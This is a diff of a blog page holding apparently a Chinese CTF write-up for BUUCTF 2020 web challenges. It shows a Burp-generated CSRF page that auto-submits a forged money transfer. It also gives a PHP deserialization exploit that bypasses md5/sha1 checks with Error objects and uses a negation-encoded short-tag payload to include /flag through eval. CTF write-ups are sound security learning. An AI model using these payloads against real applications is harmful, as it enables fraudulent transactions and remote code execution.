-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">  <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;postsubmit&quot;</span>).click();&#125;         </span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://31a0d988-edec-4409-83c4-04e3545ef852.node3.buuoj.cn/transfer.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;target&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;money&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;9999999999999999&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;messages&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();&#125;         </span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://31a0d988-edec-4409-83c4-04e3545ef852.node3.buuoj.cn/transfer.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;target&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;9999999999999999&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;messages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421121648035.png" srcset="/img/loading.gif" lazyload alt="image-20210421121648035"></p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421164726997.png" srcset="/img/loading.gif" lazyload alt="image-20210421164726997"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421121648035.png" alt="image-20210421121648035"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421164726997.png" alt="image-20210421164726997"></p>
 <p>提交成功后返回首页查看余额，购买flag即可。</p>
 <h3 id="WEB-greatphp"><a href="#WEB-greatphp" class="headerlink" title="[WEB]greatphp"></a>[WEB]greatphp</h3><p>代码审计：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>反序列化题目，可以看到想要执行命令必须满足MD5 、sha1值相等，但是既满足相等又要执行命令难以绕过。这里有个考察点就是：</p>
 <blockquote>
 <p>md5/sha1函数对一个类进行处理的时候会触发这个类的__toString魔术方法</p>
 </blockquote>
 <p>这里想到了利用原生类。利用Error 内置类，在进行处理的时候触发<code>__toString</code> ，先看一下类：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421105322749.png" srcset="/img/loading.gif" lazyload alt="image-20210421105322749"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421105322749.png" alt="image-20210421105322749"></p>
 <p>可见会输出payload 错误文件路径 以及行号，所以我们要想得到输出相同就需要在同一行：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421105525467.png" srcset="/img/loading.gif" lazyload alt="image-20210421105525467"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421105525467.png" alt="image-20210421105525467"></p>
 <p>可见这样就可以使的$a $b 相等，但是输出的报错信息相同。</p>
 <p>接下来考虑怎么代码执行，首先我们需要控制整个代码块，利用<code>?&gt;&lt;?php</code> 形式，因为过滤了<code>&lt;?php</code> 采用短标签的形式<code>&lt;?=</code> ，其次过滤了小括号 因为控制了整个代码块，可以采取<code>include</code> flag文件的形式，过滤了”，无法利用 <code>include &quot;/flag&quot;</code> 利用取反绕过：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421111104661.png" srcset="/img/loading.gif" lazyload alt="image-20210421111104661"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">输出报错信息：<span class="hljs-built_in">Error</span>: <span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/flag&quot;</span><span class="hljs-meta">?&gt;</span><span class="hljs-comment">#先闭合</span><br>拼接：<span class="hljs-keyword">eval</span>(<span class="hljs-built_in">Error</span>: <span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/flag&quot;</span><span class="hljs-meta">?&gt;</span>);<span class="hljs-comment">#成功控制代码块 包含文件</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421111104661.png" alt="image-20210421111104661"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输出报错信息：Error: ?&gt;&lt;?&#x3D;include &quot;&#x2F;flag&quot;?&gt;#先闭合</span><br><span class="line">拼接：eval(Error: ?&gt;&lt;?&#x3D;include &quot;&#x2F;flag&quot;?&gt;);#成功控制代码块 包含文件</span><br></pre></td></tr></table></figure>
 
 <p>payload：</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">“?&gt;&lt;?<span class="hljs-operator">=</span>include~”.urldeocde(<span class="hljs-variable">%D0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%98</span>).<span class="hljs-string">&quot;?&gt;&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“?&gt;&lt;?&#x3D;include~”.urldeocde(%D0%99%93%9E%98).&quot;?&gt;&quot;</span><br></pre></td></tr></table></figure>
 
 <p>exp：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br>&#125;<br><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> SYCLOVER();<br><span class="hljs-variable">$v</span>-&gt;syc=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$v</span>-&gt;lover=<span class="hljs-variable">$b</span>;<br><span class="hljs-comment">#echo serialize($v);  </span><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$v</span>));  <br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$payload</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$payload</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$v</span> = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line"><span class="variable">$v</span>-&gt;syc=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$v</span>-&gt;lover=<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">#echo serialize($v);  </span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$v</span>));  </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421113013409.png" srcset="/img/loading.gif" lazyload alt="image-20210421113013409"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210421113013409.png" alt="image-20210421113013409"></p>
 <h3 id="WEB-cross"><a href="#WEB-cross" class="headerlink" title="[WEB]cross"></a>[WEB]cross</h3><p>待解决</p>
-
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/Writeup/">Writeup</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/buuctf/">buuctf</a>
-                    
-                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">
-                  
-                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
-                  
-                </p>
-              
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2021/04/20/BUUCTF-2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
-                        <span class="hidden-mobile">BUUCTF-2019极客大挑战</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-              <!-- Comments -->
-              <article class="comments" id="comments" lazyload>
-                
-                  
-                
-                
-  <div id="valine"></div>
-  <script type="text/javascript">
-    Fluid.utils.lazyComments('valine', function() {
-      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
-        new Valine({
-          el: "#valine",
-          app_id: "UswuQRbwcTDBG5vbfIqqVVfx-gzGzoHsz",
-          app_key: "Cx1JkrDveTlnjg6rTJnYlyQw",
-          placeholder: "说点什么",
-          path: window.location.pathname,
-          avatar: "retro",
-          meta: ["nick","mail","link"],
-          pageSize: "10",
-          lang: "zh-CN",
-          highlight: false,
-          recordIP: false,
-          serverURLs: "",
-        });
-      });
-    });
-  </script>
-  <noscript>Please enable JavaScript to view the
-    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
-  </noscript>
-
-
-              </article>
-            
-          </article>
-        </div>
-      </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-<!-- Custom -->
-
-
-    
-
-    
-      <a id="scroll-top-button" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-    
-
-    
-  </main>
-
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="" target="_blank" rel="nofollow noopener"><span>Virtua1</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/v1sun" target="_blank" rel="nofollow noopener"><span>Github</span></a> 
-  </div>
-  
-
-  
-
-  
-</footer>
-
-
-  <!-- SCRIPTS -->
-  
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
-
-
-
-  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
-
-
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-      typing(title)
-      
-    })(window, document);
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    (function () {
-      var path = "/local-search.xml";
-      $('#local-search-input').on('click', function() {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      });
-      $('#modalSearch').on('shown.bs.modal', function() {
-        $('#local-search-input').focus();
-      });
-    })()
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
-
-
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Virtua1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://v1sun.github.io/2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">https://v1sun.github.io/2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://v1sun.github.io" target="_blank">Virtua1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/buuctf/">buuctf</a><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/virtua1/note_pictures/raw/master/20210502232517.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/04/19/BUUCTF-2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"><img class="next-cover" src="https://gitee.com/virtua1/note_pictures/raw/master/20210419210907.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF-GYCTF2020</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/04/19/BUUCTF-2019极客大挑战/" title="BUUCTF-GYCTF2020"><img class="cover" src="https://gitee.com/virtua1/note_pictures/raw/master/20210419210907.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-19</div><div class="title">BUUCTF-GYCTF2020</div></div></a></div><div><a href="/2021/04/19/BUUCTF-GYCTF2020/" title="BUUCTF-GYCTF2020"><img class="cover" src="https://gitee.com/virtua1/note_pictures/raw/master/20210502232617.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-19</div><div class="title">BUUCTF-GYCTF2020</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Virtua1</div><div class="author-info__description">你只有非常努力，才能看起来毫不费力</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/v1sun/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98"><span class="toc-number">1.</span> <span class="toc-text">BUUCTF-2020极客大挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-Welcome"><span class="toc-number">1.1.</span> <span class="toc-text">[WEB]Welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-myblog"><span class="toc-number">1.2.</span> <span 